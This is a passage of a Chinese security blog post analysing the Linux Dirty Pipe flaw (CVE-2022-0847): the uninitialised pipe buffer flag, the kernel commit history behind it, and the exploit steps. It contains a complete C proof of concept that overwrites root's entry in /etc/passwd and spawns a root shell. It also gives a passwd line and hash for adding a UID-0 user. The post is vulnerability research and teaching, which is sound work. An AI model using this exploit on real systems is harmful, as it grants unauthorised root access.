<p>​    漏洞所在的copy_page_to_iter_pipe 函数主要做的工作就是将pipe 缓存页结构指向要传输的文件的文件缓存页，其代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">size_t</span> <span class="title">copy_page_to_iter_pipe</span><span class="params">(struct page *page, <span class="keyword">size_t</span> offset, <span class="keyword">size_t</span> bytes,</span></span></span><br><span class="line"><span class="params"><span class="function">			 struct iov_iter *i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> i-&gt;pipe;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> p_tail = pipe-&gt;tail;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> p_mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> i_head = i-&gt;head;</span><br><span class="line">	<span class="keyword">size_t</span> off;</span><br><span class="line"></span><br><span class="line">	··· ···</span><br><span class="line"></span><br><span class="line">	off = i-&gt;iov_offset;</span><br><span class="line">	buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<span class="comment">//[1]获取对应的pipe 缓存页</span></span><br><span class="line">	··· ···</span><br><span class="line">	</span><br><span class="line">	buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<span class="comment">//[2]修改pipe 缓存页的相关信息指向文件缓存页</span></span><br><span class="line">	get_page(page);</span><br><span class="line">	buf-&gt;page = page;<span class="comment">//[2]页指针指向了文件缓存页</span></span><br><span class="line">	buf-&gt;offset = offset;<span class="comment">//[2]offset len 等设置为当前信息(通过splice 传入参数决定)</span></span><br><span class="line">	buf-&gt;len = bytes;</span><br><span class="line"></span><br><span class="line">	pipe-&gt;head = i_head + <span class="number">1</span>;</span><br><span class="line">	i-&gt;iov_offset = offset + bytes;</span><br><span class="line">	i-&gt;head = i_head;</span><br><span class="line">out:</span><br><span class="line">	i-&gt;count -= bytes;</span><br><span class="line">	<span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<pre><code> 可以看到中间各种的赋值，就是在初始化Pipe_buf中的相应的内容，让其指向page cache，但是这里竟然没有初始化进行权限校验的flag。。。
</code></pre>
<p>​    这个flag很明显就是为了针对用户不具有读写权限的文件，不能乱写，结果这里没初始化，那这个flag还有什么意义呢？一位<a target="_blank" rel="noopener" href="https://blog.csdn.net/Breeze_CAT/article/details/123393188?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164878673016782246497863%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=164878673016782246497863&biz_id=&utm_medium=distribute.pc_search_result.none-task-code-2allfirst_rank_ecpm_v1~rank_v31_ecpm-2-123393188-1.142v5pc_search_result_cache&utm_term=CVE-2022-0847%E5%88%86%E6%9E%90https://blog.csdn.net/weixin_44820088/article/details/123364275?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164878673016782246497863%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=164878673016782246497863&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2allfirst_rank_ecpm_v1~rank_v31_ecpm-4-123364275.142v5pc_search_result_cache&utm_term=CVE-2022-0847%E5%88%86%E6%9E%90&spm=1018.2226.3001.4187">前辈</a>也这么说：</p>
<blockquote>
<p>PIPE_BUF_FLAG_CAN_MERGE 这个flag 总共就出现了5次，一次#define 声明，两次在pipe_write 里。剩下两次都在splice 之中：</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/099f85b6f8f249c8b52b6a88f4a1d0b1.png#pic_center" alt="在这里插入图片描述"></p>
<p>而且根据这个变量参与的代码可知，这个变量的意义就是是否允许在当前最新pipe 缓存页中续写；一般pipe 自己申请的页，就是个普通页，续写就续写很正常。什么情况不能续写，那就是这个页不是你pipe 自己申请的页，你不可以随便改。所以由目前的状况来看，几乎也就splice 中涉及到了非pipe 自己申请的页。换言之，PIPE_BUF_FLAG_CAN_MERGE 这个flag 就是为splice 设计的。然后你告诉我你不初始化的吗？</p>
</blockquote>
<p>​    在继续对这个洞深入了解之后，我发现是历史原因。。。</p>
<h3 id="二、漏洞的迭代过程"><a href="#二、漏洞的迭代过程" class="headerlink" title="二、漏洞的迭代过程"></a>二、漏洞的迭代过程</h3><p>参看：    <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/270067#h2-7">https://www.anquanke.com/post/id/270067#h2-7</a>    最后一部分</p>
<p>总结一下：</p>
<p>​    <a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/5274f052e7b3dbd81935772eb551dfd0325dfa9d">Linux 2.6</a>, 引入了<code>splice()</code>系统调用;</p>
<p>​    <a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b">Linux 4.9</a>, 添加了iov_iter（就是一个迭代器模型，不重要）对Pipe的支持, 其中<code>copy_page_to_iter_pipe()</code>与<code>push_pipe()</code>函数实现中当时就缺少对pipe buffer中<code>flag</code>的初始化操作！</p>
<p>​    但在当时并无大碍, 因为当时使用判断是否的属性：<code>can_merge</code>属性。</p>
<p>​    <a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/01e7187b41191376cee8bea8de9f907b001e87b4">Linux 5.1</a>, 由于在众多类型的pipe_buffer中, 只有<code>anon_pipe_buf_ops</code>这一种情况的<code>can_merge</code>属性是为1的(<code>can_merge</code>字段在结构体中占一个int大小的空间), 所以, 将<code>pipe_buf_operations</code>结构体中的<code>can_merge</code>属性删除, 并且把merge操作时的判断改为指针判断, 合情合理。正是如此, <code>copy_page_to_iter_pipe()</code>中对<code>buf-&gt;ops</code>的初始化操作已经不包含<code>can_merge</code>属性初始化的功能了, 只是<code>push_write()</code>中merge操作的判断依然正常, 所以依然不会触发漏洞。</p>
<p>​    简单的说，由于<code>can_merge</code>属性占空间，所有又被删掉了，添加了直接判断类型的代码。</p>
<p>​    <a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">Linux 5.8中</a>, 把各种类型的<code>pipe_buf_operations</code>结构体进行合并, 正式把<code>can_merge</code>标记改为<code>PIPE_BUF_FLAG_CAN_MERGE</code>合并进入flag属性中, 知道此时, 4.9补丁中<code>没有flag字段初始化</code>的隐患才真正生效。</p>
<p>​    简单的说，前面没有用到flag，所以没有初始化；后面用到了flag的时候，以为前面已经初始化了，就没有检查，总之还是愚蠢至极。</p>
<h2 id="0x03-poc构造"><a href="#0x03-poc构造" class="headerlink" title="0x03 poc构造"></a>0x03 poc构造</h2><h3 id="一、利用步骤"><a href="#一、利用步骤" class="headerlink" title="一、利用步骤"></a>一、利用步骤</h3><ul>
<li>创建一个管道</li>
<li>将管道填充满(通过pipe_write)，这样所有的buf(pipe 缓存页)都初始化过了，flag 默认初始化为PIPE_BUF_FLAG_CAN_MERGE</li>
<li>将管道清空(通过pipe_read)，这样通过splice 系统调用传送文件的时候就会使用原有的初始化过的buf结构。</li>
<li>调用splice 函数将想要篡改的文件传送入</li>
<li>继续向pipe写入内容(pipe_write)，这时就会覆盖到文件缓存页了，完成暂时文件篡改。</li>
</ul>
<h3 id="二、文件选择"><a href="#二、文件选择" class="headerlink" title="二、文件选择"></a>二、文件选择</h3><p>能越权读写之后，我们需要选择一个文件对其进行修改，达成提权的效果，那么选哪个呢？</p>
<p>​    在原poc中，他选择的文件是**/etc/passwd**：</p>
<p>我们先看看源文件里面有些什么：</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220429140725028.png" alt="image-20220429140725028"></p>
<p>每个用户的形式以这样的结构表示</p>
<p><strong>用户名：密码：UID（用户ID）：GID（组ID）：描述性信息：主目录：默认Shell</strong></p>
<p>这里有两个关键字段：</p>
<h4 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h4><p>​    “x” 表示此用户设有密码，但不是真正的密码（也不能是，谁都能读还得了嘛），真正的密码保存在 /etc/shadow 文件中，但是这里也是可以存真实的密码加盐后的值的，因此我们可以利用。</p>
<h4 id="UID"><a href="#UID" class="headerlink" title="UID"></a>UID</h4><p>​    UID，也就是用户 ID。每个用户都有唯一的一个 UID，UID 是一个 0~65535 之间的数，不同范围的数字表示不同的用户身份，具体如表所示：</p>
<table>
<thead>
<tr>
<th>UID 范围</th>
<th>用户身份</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>超级用户。UID 为 0 就代表这个账号是管理员账号。在 Linux 中，如何把普通用户升级成管理员呢？只需把其他用户的 UID 修改为 0 就可以了，这一点和 Windows 是不同的。不过不建议建立多个管理员账号。</td>
</tr>
<tr>
<td>1~499</td>
<td>系统用户（伪用户）。也就是说，此范围的 UID 保留给系统使用。其中，1<del>99 用于系统自行创建的账号；100</del>499 分配给有系统账号需求的用户。  其实，除了 0 之外，其他的 UID 并无不同，这里只是默认 500 以下的数字给系统作为保留账户，只是一个公认的习惯而已。</td>
</tr>
<tr>
<td>500~65535</td>
<td>普通用户。通常这些 UID 已经足够用户使用了。但不够用也没关系，2.6.x 内核之后的 Linux 系统已经可以支持 232 个 UID 了。</td>
</tr>
</tbody></table>
<h4 id="利用方式："><a href="#利用方式：" class="headerlink" title="利用方式："></a>利用方式：</h4><p>首先，使用perl语言生成带有盐值的密码：</p>
<p>​    命令： <code>perl -le ‘print crypt(“test”,“addedsalt”)’</code><br>​    输出：<em>adMpHktIn0tR2</em></p>
<p>然后将下面的内容，将test用户的信息加入到/etc/passwd 文件末尾；</p>
<p>​    <code>test:adMpHktIn0tR2:0:0:User_like_root:/root:/bin/bash</code></p>
<h3 id="三、poc"><a href="#三、poc" class="headerlink" title="三、poc"></a>三、poc</h3><h4 id="官方poc："><a href="#官方poc：" class="headerlink" title="官方poc："></a>官方poc：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PAGE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span></span><br><span class="line"><span class="comment"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">prepare_pipe</span><span class="params">(<span class="keyword">int</span> p[<span class="number">2</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (pipe(p)) <span class="built_in">abort</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">unsigned</span> pipe_size = fcntl(p[<span class="number">1</span>], F_GETPIPE_SZ);</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* fill the pipe completely; each pipe_buffer will now have</span></span><br><span class="line"><span class="comment">	   the PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">		<span class="keyword">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">		write(p[<span class="number">1</span>], buffer, n);</span><br><span class="line">		r -= n;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* drain the pipe, freeing all pipe_buffer instances (but</span></span><br><span class="line"><span class="comment">	   leaving the flags initialized) */</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">		<span class="keyword">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">		read(p[<span class="number">0</span>], buffer, n);</span><br><span class="line">		r -= n;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* the pipe is now empty, and if somebody adds a new</span></span><br><span class="line"><span class="comment">	   pipe_buffer without initializing its &quot;flags&quot;, the buffer</span></span><br><span class="line"><span class="comment">	   will be mergeable */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> path = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Backing up /etc/passwd to /tmp/passwd.bak ...\n&quot;</span>);</span><br><span class="line">        FILE *f1 = fopen(<span class="string">&quot;/etc/passwd&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">        FILE *f2 = fopen(<span class="string">&quot;/tmp/passwd.bak&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (f1 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed to open /etc/passwd\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (f2 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed to open /tmp/passwd.bak\n&quot;</span>);</span><br><span class="line">            fclose(f1);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> c;</span><br><span class="line">        <span class="keyword">while</span> ((c = fgetc(f1)) != EOF)</span><br><span class="line">            fputc(c, f2);</span><br><span class="line"></span><br><span class="line">        fclose(f1);</span><br><span class="line">        fclose(f2);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">loff_t</span> offset = <span class="number">4</span>; <span class="comment">// after the &quot;root&quot;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> data = <span class="string">&quot;:$1$aaron$pIwpJwMMcozsUxAtRa85w.:0:0:test:/root:/bin/sh\n&quot;</span>; <span class="comment">// openssl passwd -1 -salt aaron aaron </span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Setting root password to \&quot;aaron\&quot;...\n&quot;</span>);</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">size_t</span> data_size = <span class="built_in">strlen</span>(data);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (offset % PAGE_SIZE == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot start writing at a page boundary\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class="number">1</span>)) + <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">loff_t</span> end_offset = offset + (<span class="keyword">loff_t</span>)data_size;</span><br><span class="line">	<span class="keyword">if</span> (end_offset &gt; next_page) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot write across a page boundary\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* open the input file and validate the specified offset */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">int</span> fd = open(path, O_RDONLY); <span class="comment">// yes, read-only! :-)</span></span><br><span class="line">	<span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;open failed&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">	<span class="keyword">if</span> (fstat(fd, &amp;st)) &#123;</span><br><span class="line">		perror(<span class="string">&quot;stat failed&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (offset &gt; st.st_size) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Offset is not inside the file\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (end_offset &gt; st.st_size) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot enlarge the file\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* create the pipe with all flags initialized with</span></span><br><span class="line"><span class="comment">	   PIPE_BUF_FLAG_CAN_MERGE */</span></span><br><span class="line">	<span class="keyword">int</span> p[<span class="number">2</span>];</span><br><span class="line">	prepare_pipe(p);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* splice one byte from before the specified offset into the</span></span><br><span class="line"><span class="comment">	   pipe; this will add a reference to the page cache, but</span></span><br><span class="line"><span class="comment">	   since copy_page_to_iter_pipe() does not initialize the</span></span><br><span class="line"><span class="comment">	   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span></span><br><span class="line">	--offset;</span><br><span class="line">	<span class="keyword">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;splice failed&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (nbytes == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short splice\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* the following write will not create a new pipe_buffer, but</span></span><br><span class="line"><span class="comment">	   will instead write into the page cache, because of the</span></span><br><span class="line"><span class="comment">	   PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class="line">	nbytes = write(p[<span class="number">1</span>], data, data_size);</span><br><span class="line">	<span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;write failed&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ((<span class="keyword">size_t</span>)nbytes &lt; data_size) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short write\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> *argv[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;(echo aaron; cat) | su - -c \&quot;&quot;</span></span><br><span class="line">                <span class="string">&quot;echo \\\&quot;Restoring /etc/passwd from /tmp/passwd.bak...\\\&quot;;&quot;</span></span><br><span class="line">                <span class="string">&quot;cp /tmp/passwd.bak /etc/passwd;&quot;</span></span><br><span class="line">                <span class="string">&quot;echo \\\&quot;Done! Popping shell... (run commands now)\\\&quot;;&quot;</span></span><br><span class="line">                <span class="string">&quot;/bin/sh;&quot;</span></span><br><span class="line">            <span class="string">&quot;\&quot; root&quot;</span>&#125;;</span><br><span class="line">        execv(<span class="string">&quot;/bin/sh&quot;</span>, argv);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;system() function call seems to have failed :(\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用思路和上述的思路是一样的。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">lhl_2507</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://lhl7.github.io/2022/04/29/CVE-2022-0847%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/">https://lhl7.github.io/2022/04/29/CVE-2022-0847%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/index.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/05/08/pwn%E5%85%A5%E9%97%A8%E4%B9%8Bgot&amp;plt%E8%A1%A8/"><img class="prev-cover" src="/img/index.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">pwn入门之got&amp;plt表</div></div></a></div><div class="next-post pull-right"><a href="/2022/04/20/writeup-level3-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E5%8C%BA/"><img class="next-cover" src="/img/index.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">writeup-level3-攻防世界pwn新手区</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">lhl_2507</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">52</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">12</div></a></div></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/lhl7" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2022-0847%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">CVE-2022-0847内核提权漏洞分析复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 背景知识</span></a><ol class="toc-child"><li 